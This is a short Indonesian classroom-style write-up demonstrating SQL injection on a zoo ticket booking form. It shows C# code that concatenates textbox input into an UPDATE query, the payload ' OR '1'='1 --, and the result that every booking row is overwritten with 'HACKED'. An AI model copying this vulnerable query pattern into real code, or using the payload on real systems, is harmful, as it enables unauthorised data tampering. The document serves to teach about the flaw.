SQL Injection Scenario pada Sistem Pemesanan Tiket Kebun Binatang

SQL Injection diterapkan pada FormDataBooking menggunakan tombol btnTestInjection.

Query yang digunakan:
string query = "UPDATE Booking SET Nama = 'HACKED' WHERE KodeBooking = '" + textBox1.Text + "'";

Query tersebut rentan terhadap SQL Injection karena input dari user langsung digabungkan ke query SQL.

Skenario Injection:
Input pada textbox:
' OR '1'='1 --

Query yang dijalankan:
UPDATE Booking 
SET Nama = 'HACKED' 
WHERE KodeBooking = '' OR '1'='1'

Hasil nya 
Semua data pada tabel Booking berhasil terupdate dan nilai kolom Nama berubah menjadi HACKED.
